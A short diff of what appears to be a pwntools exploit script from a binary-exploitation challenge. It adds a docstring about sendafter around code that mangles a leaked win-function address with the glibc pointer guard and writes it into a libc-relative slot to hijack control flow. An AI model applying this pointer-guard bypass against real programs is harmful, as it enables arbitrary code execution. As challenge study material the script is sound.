@@ -105,7 +105,9 @@ PTR_GUARD = int(p.recvline(keepends=False).decode(), 16) # i suppose it is for m
 
 initial = libc + 0x1E9000
 payload = mangle(win_leak) # create the mangled form of win_leak (addr ^ PTR_GUARD, rotate left 17)
-
+"""
+sendafter is a combination of ``recvuntil(delim, timeout=timeout)`` and ``send(data)``.
+"""
 p.sendafter(b": ", p64(initial + 0x18)) # wait for ": " then send 8-byte little-endian address of the target slot (initial+0x18)
 p.sendafter(b": ", p64(payload)) # wait for ": " then send the 8-byte mangled pointer to be written there
 
